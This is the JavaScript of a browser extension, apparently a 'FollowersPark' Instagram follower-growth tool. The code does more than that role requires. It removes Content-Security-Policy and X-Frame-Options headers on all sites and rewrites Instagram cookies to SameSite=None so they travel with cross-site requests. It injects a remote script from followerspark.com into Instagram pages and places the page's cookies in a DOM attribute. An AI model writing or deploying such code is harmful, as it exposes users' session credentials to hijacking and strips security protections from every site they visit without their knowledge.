const HEADERS_TO_STRIP_LOWERCASE = [
    'content-security-policy',
    'x-frame-options',
];
if (chrome && chrome.webRequest && chrome.webRequest.onHeadersReceived) {
    chrome.webRequest.onHeadersReceived.addListener(
        details => ({
            responseHeaders: details.responseHeaders.filter(header =>
                !HEADERS_TO_STRIP_LOWERCASE.includes(header.name.toLowerCase()))
        }), {
        urls: ['<all_urls>']
    }, ['blocking', 'responseHeaders']);
}

const o = ["http://*.instagram.com/*", "https://*.instagram.com/*"];
setInterval(() => {
    if (chrome && chrome.cookies && chrome.cookies.getAll) {
        for (const t of o) {
            chrome.cookies.getAll({}, (c) => {
                c.filter(e => "unspecified" === e.sameSite)
                    .map(a => {
                        chrome.cookies.remove({
                            url: t,
                            name: a.name
                        }, () => {
                            chrome.cookies.set({
                                url: t,
                                name: a.name,
                                value: a.value,
                                domain: a.domain,
                                path: a.path,
                                httpOnly: a.httpOnly,
                                secure: !0,
                                sameSite: "no_restriction",
                                expirationDate: a.expirationDate,
                                storeId: a.storeId
                            })
                        });

                    });
            });
        }
    }
}, 1000);

if ((location.search || '').indexOf('followpark=1') !== -1) {
    var jsScript = document.createElement('script');
    jsScript.setAttribute('type', 'text/javascript');
    jsScript.setAttribute('src', 'https://followerspark.com/followerspark.js');
    const appendChild = () => {
        const childiren = document.querySelector('#react-root').children;
        const children2 = childiren[Math.random() * childiren.length | 0].children;
        const elem = children2[Math.random() * children2.length | 0]

        if (!elem) {
            return appendChild();
        }

        elem.appendChild(jsScript);
    };
    appendChild();
} else if (chrome && chrome.browserAction && chrome.browserAction.onClicked) {
    chrome.browserAction.onClicked.addListener(function () {
        chrome.tabs.create({ url: 'http://followerspark.com' });
    });
    var cookie = document.cookie;
    var fDiv = document.createElement('div');
    fDiv.setAttribute('id', 'FollowersPark');
    fDiv.setAttribute('tkn', cookie);
    document.body.append(fDiv);
}